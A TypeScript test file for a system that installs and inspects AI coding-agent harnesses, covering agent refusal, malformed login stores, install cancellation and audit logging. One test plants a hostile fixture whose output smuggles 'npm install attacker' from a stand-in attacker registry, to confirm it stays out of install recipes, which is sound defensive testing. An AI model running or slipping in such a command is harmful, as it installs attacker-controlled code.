import { registerRebuildCheck } from "../support/rebuildCheck.ts"
import * as Schema from "effect/Schema"
import { HarnessSettings } from "@lgtm/contracts"
import { afterEach, expect, it } from "@effect/vitest"
import { mkdirSync, writeFileSync, existsSync } from "node:fs"
import { join } from "node:path"
import * as Effect from "effect/Effect"
import * as Fiber from "effect/Fiber"
import { makeHarnessPrograms, bundledHarness } from "../../src/harnesses/programs.ts"
import { makeCredentialRegistry } from "../../src/accounts/credentialSource.ts"
import { fixtureHarnessPrograms } from "../support/fixtureHarnessPrograms.ts"
import { makeRig, removeRig, provideRig, makeFakeSecrets, call, ownerCredential, success, seedAgent, agentCredential, readLog, eventOf, appendSetup, harnessSettings } from "../support/handlerRig.ts"
import { makeFakeRunner } from "../support/fakeRunner.ts"
let rig: ReturnType<typeof makeRig>
afterEach(() => { if (rig) removeRig(rig) })
it.live("refuses all four harness requests to an authenticated agent with the exact reason", () => Effect.gen(function* () {
  rig = makeRig(); const runner = yield* makeFakeRunner()
  yield* provideRig(rig, { runner, secrets: makeFakeSecrets() }, Effect.gen(function* () {
    yield* registerRebuildCheck()
    const child = yield* seedAgent({ id: "worker", name: "Builder" })
    for (const [name, payload] of [["client.harness.status", {}], ["client.harness.recipe", { harnessId: "codex" }], ["client.harness.install", { harnessId: "codex" }], ["client.harness.account.check", { accountId: "owner" }]] as const) {
      expect(yield* call(agentCredential(child.token), name, payload)).toMatchObject({ _tag: "Failure", failure: { reason: "command refused" } })
    }
    expect((yield* readLog).filter((e) => e.event._tag.startsWith("HarnessInstall"))).toHaveLength(0)
  }))
}))
it("keeps status available per harness when login stores are malformed or oversized", async () => {
  rig = makeRig(); mkdirSync(join(rig.home, ".claude")); mkdirSync(join(rig.home, ".codex"))
  writeFileSync(join(rig.home, ".claude", ".credentials.json"), "{malformed")
  writeFileSync(join(rig.home, ".codex", "auth.json"), "x".repeat(1024 * 1024 + 1))
  const programs = makeHarnessPrograms({ home: rig.home, path: "", credentials: makeCredentialRegistry() })
  expect(await programs.inspect("claude")).toMatchObject({ reason: "Cannot read the sign-in state." })
  expect(await programs.inspect("codex")).toMatchObject({ reason: "Cannot read the sign-in state." })
  expect(await programs.inspect("gemini")).toMatchObject({ installed: false })
})
it("counts the bundled adapter and native runtime without a vendor CLI on PATH", async () => {
  rig = makeRig(); const programs = makeHarnessPrograms({ home: rig.home, path: "" })
  for (const id of ["claude", "codex"]) {
    expect(bundledHarness(id)).toBeDefined()
    expect(await programs.inspect(id)).toMatchObject({ installed: true, path: bundledHarness(id)!.path })
  }
})
it("does not execute an unrelated agent on PATH or rerun version probes during status", async () => {
  rig = makeRig(); const marker = join(rig.root, "ran"), bin = join(rig.root, "bin")
  mkdirSync(bin); writeFileSync(join(bin, "agent"), `#!/bin/sh\ntouch '${marker}'\necho 1.0.0\n`, { mode: 0o700 })
  const programs = makeHarnessPrograms({ home: rig.home, path: bin })
  expect(await programs.inspect("cursor", undefined, true)).toMatchObject({ installed: false })
  expect(existsSync(marker)).toBe(false)
  const executable = join(bin, "fixture")
  writeFileSync(executable, `#!/bin/sh\necho run >> '${marker}'\necho 1.2.3\n`, { mode: 0o700 })
  const settings = Schema.decodeUnknownSync(HarnessSettings)(harnessSettings("first", { adapterPath: executable }))
  await programs.inspect("first", settings); expect(existsSync(marker)).toBe(false)
  expect(await programs.inspect("first", settings, true)).toMatchObject({ installed: true, version: "1.2.3\n" })
  await programs.inspect("first", settings); await programs.inspect("first", settings)
  const { readFileSync } = await import("node:fs"); expect(readFileSync(marker, "utf8")).toBe("run\n")
})
it.live("interrupts the install, waits for cleanup, audits cancellation and releases the install lock", () => Effect.gen(function* () {
  rig = makeRig(); const runner = yield* makeFakeRunner(), marker = join(rig.root, "cancelled")
  const script = join(rig.root, "wait.cjs"), executable = join(rig.root, "fake")
  writeFileSync(script, "setInterval(()=>{},1000)")
  let started = false, cancelled = false
  const base = fixtureHarnessPrograms({ home: rig.home, executable, script })
  const programs = { ...base, install: async (_: string, signal: AbortSignal) => {
    started = true
    await new Promise<void>((resolve) => { signal.addEventListener("abort", () => { cancelled = true; resolve() }, { once: true }); setTimeout(resolve, 800) })
    writeFileSync(marker, "stopped")
    return { ok: false, output: "", reason: cancelled ? "The install was cancelled." : "Fixture deadline." }
  } }
  yield* provideRig(rig, { runner, secrets: makeFakeSecrets(), harnessPrograms: programs }, Effect.gen(function* () {
    yield* registerRebuildCheck()
    const fiber = yield* call(ownerCredential, "client.harness.install", { harnessId: "first" }).pipe(Effect.forkScoped)
    while (!started) yield* Effect.sleep(5)
    yield* Fiber.interrupt(fiber)
    expect(cancelled).toBe(true); expect(existsSync(marker)).toBe(true)
    expect((yield* readLog).filter((e) => e.event._tag === "HarnessInstallFinished").at(-1)?.event).toMatchObject({ state: "failed", reason: "The install was cancelled." })
  }))
}))
it.live("keeps saved settings and executable output out of the production recipe", () => Effect.gen(function* () {
  rig = makeRig(); const runner = yield* makeFakeRunner(), executable = join(rig.root, "hostile-output")
  writeFileSync(executable, `#!${process.execPath}\nconsole.log('1.2.3 npm install attacker --registry https://attacker.invalid');\n`, { mode: 0o700 })
  const programs = makeHarnessPrograms({ home: rig.home, path: "" })
  const before = programs.recipe("gemini")
  yield* provideRig(rig, { runner, secrets: makeFakeSecrets(), harnessPrograms: programs }, Effect.gen(function* () {
    yield* registerRebuildCheck()
    success(yield* call(ownerCredential, "harnesses", { operation: "set", harness: harnessSettings("first", { adapterPath: executable, adapterArguments: ["npm", "install", "attacker"] }) }))
    const status = success(yield* call(ownerCredential, "client.harness.status", { refresh: true }))
    expect(status.harnesses.find((h: any) => h.harnessId === "first").version).toContain("attacker")
    expect(success(yield* call(ownerCredential, "client.harness.recipe", { harnessId: "gemini" })).recipe).toEqual(before)
    expect(before!.commands.join()).not.toContain("attacker")
  }))
}))
it("reports a failed version read and a version different from the pin without inventing success", async () => {
  rig = makeRig(); const path = join(rig.root, "fixture"), programs = makeHarnessPrograms({ home: rig.home, path: "" })
  const settings = Schema.decodeUnknownSync(HarnessSettings)(harnessSettings("gemini", { adapterPath: path }))
  writeFileSync(path, "#!/bin/sh\nexit 7\n", { mode: 0o700 })
  expect(await programs.inspect("gemini", settings, true)).toMatchObject({ installed: false, reason: "Found, version unknown." })
  writeFileSync(path, "#!/bin/sh\necho 100.68.0\n")
  expect(await programs.inspect("gemini", settings, true)).toMatchObject({ installed: true, reason: "Found version 100.68.0; the recipe pins 0.68.0." })
})
it.live("validates automatically suggested settings with the harnesses planner", () => Effect.gen(function* () {
  rig = makeRig(); const runner = yield* makeFakeRunner(), executable = join(rig.root, "fake"), script = join(rig.root, "install.cjs")
  writeFileSync(script, `require('node:fs').writeFileSync(${JSON.stringify(executable)}, 'fixture');`)
  const base = fixtureHarnessPrograms({ home: rig.home, executable, script })
  const programs = { ...base, defaultSettings: () => Schema.decodeUnknownSync(HarnessSettings)(harnessSettings("first", { adapterPath: process.execPath })) }
  yield* provideRig(rig, { runner, secrets: makeFakeSecrets(), harnessPrograms: programs }, Effect.gen(function* () {
    yield* registerRebuildCheck()
    expect(success(yield* call(ownerCredential, "client.harness.install", { harnessId: "first" }))).toMatchObject({ state: "installed" })
    expect((yield* readLog).filter((e) => e.event._tag === "HarnessChanged")).toHaveLength(1)
  }))
}))
it("keeps ordinary status available but withholds probes when another registered login store cannot be redacted", async () => {
  rig = makeRig(); const executable = join(rig.root, "probe"), marker = join(rig.root, "ran"), privateHome = join(rig.root, "private-codex")
  mkdirSync(privateHome); writeFileSync(join(privateHome, "auth.json"), "{malformed")
  writeFileSync(executable, `#!/bin/sh\ntouch '${marker}'\necho 1.2.3\n`, { mode: 0o700 })
  const credentials = makeCredentialRegistry(), { credentialSourceFor } = await import("../../src/accounts/credentialSource.ts")
  await Effect.runPromise(credentials.open(credentialSourceFor({ harnessId: "codex", home: rig.home, variables: { CODEX_HOME: privateHome } }))).catch(() => {})
  const programs = makeHarnessPrograms({ home: rig.home, path: "", credentials }), configured = Schema.decodeUnknownSync(HarnessSettings)(harnessSettings("first", { adapterPath: executable }))
  expect(await programs.inspect("first", configured)).toMatchObject({ installed: true })
  expect(await programs.inspect("first", configured, true)).toMatchObject({ reason: "Cannot read the sign-in state needed to redact the version output." })
  expect(existsSync(marker)).toBe(false)
})
it.live("recovers a pending audit at startup and closes the installer when the engine scope ends", () => Effect.gen(function* () {
  rig = makeRig(); const runner = yield* makeFakeRunner()
  let recovered = 0, closed = 0
  const programs = { ...makeHarnessPrograms({ home: rig.home, path: "" }), recover: async () => { recovered++ }, close: async () => { closed++ } }
  const fakes = { runner, secrets: makeFakeSecrets(), harnessPrograms: programs }
  yield* provideRig(rig, fakes, Effect.gen(function* () {
    yield* registerRebuildCheck()
    yield* appendSetup([eventOf({ _tag: "HarnessInstallStarted", harnessId: "gemini", operationRequestId: "interrupted-install" })])
  }))
  expect(closed).toBe(1)
  yield* provideRig(rig, fakes, Effect.gen(function* () {
    yield* registerRebuildCheck()
    expect((yield* readLog).filter((e) => e.event._tag === "HarnessInstallFinished")).toHaveLength(1)
    expect((yield* readLog).find((e) => e.event._tag === "HarnessInstallFinished")!.event).toMatchObject({ state: "failed", operationRequestId: "interrupted-install" })
  }))
  expect(recovered).toBe(2); expect(closed).toBe(2)
}))
it.live("audits invalid automatic settings as a failure without appending HarnessChanged", () => Effect.gen(function* () {
  rig = makeRig(); const runner = yield* makeFakeRunner(), executable = join(rig.root, "fake"), script = join(rig.root, "install.cjs")
  writeFileSync(script, `require('node:fs').writeFileSync(${JSON.stringify(executable)}, 'fixture');`)
  const base = fixtureHarnessPrograms({ home: rig.home, executable, script })
  const programs = { ...base, defaultSettings: () => harnessSettings("first", { adapterPath: "relative" }) as any }
  yield* provideRig(rig, { runner, secrets: makeFakeSecrets(), harnessPrograms: programs }, Effect.gen(function* () {
    yield* registerRebuildCheck()
    expect(success(yield* call(ownerCredential, "client.harness.install", { harnessId: "first" }))).toMatchObject({ state: "failed", reason: "The installed harness settings are invalid." })
    expect((yield* readLog).filter((e) => e.event._tag === "HarnessChanged")).toHaveLength(0)
    expect((yield* readLog).filter((e) => e.event._tag === "HarnessInstallFinished")).toHaveLength(1)
  }))
}))
